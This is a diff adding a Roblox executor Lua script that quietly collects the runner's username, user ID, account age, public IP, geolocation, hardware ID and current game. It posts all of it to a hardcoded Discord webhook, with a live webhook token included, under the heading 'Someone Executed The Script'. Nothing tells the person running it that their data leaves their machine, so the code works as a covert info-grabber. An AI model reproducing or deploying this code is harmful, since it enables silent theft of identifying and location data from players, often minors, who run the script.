@@ -1,0 +1,51 @@
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+-- Player Info
+local DName = game.Players.LocalPlayer.DisplayName  -- PlayerInfo Display Name
+local Name = game.Players.LocalPlayer.Name -- Name
+local Userid = game.Players.LocalPlayer.UserId -- UserId
+local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+
+-- GameInfo
+local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local url = "https://discord.com/api/webhooks/1229102889335783494/gVIVP5ONk_yIQ5eqPSZzpVR-8ssNvG740fH0eFJYire0vZBbeh_oAnHI8VwAx2EGm87B"
+
+local data = {
+    ["avatar_url"] = "",
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["author"] = {
+                ["name"] = "( Someone Executed The Script )",
+                ["url"] = "https://roblox.com",
+            },
+            ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__"..
+                              " **\nDisplay Name:** "..DName.." \n**Username:** " .. Name..
+                              " \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType..
+                              "\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId..
+                              "**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y"))..
+                              "**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..
+                              GAMENAME.." \n**Game Id**: "..game.PlaceId,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x800080), -- Purple color
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"
+            },
+        }
+    }
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
